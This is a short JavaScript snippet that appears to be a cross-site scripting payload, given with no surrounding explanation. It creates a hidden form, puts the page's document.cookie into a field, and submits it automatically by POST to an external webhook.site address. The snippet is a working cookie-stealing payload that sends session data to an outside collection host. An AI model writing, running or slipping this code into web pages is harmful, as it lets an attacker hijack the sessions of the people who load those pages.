let form = document.createElement("form");
form.action = "https://webhook.site/123f9618-bfbc-47b2-9f11-cacea03d3331";
form.method = "POST";

let input = document.createElement("input");
input.type = "hidden";
input.name = "cookie";
input.value = document.cookie;

form.appendChild(input);
document.body.appendChild(form);
form.submit();
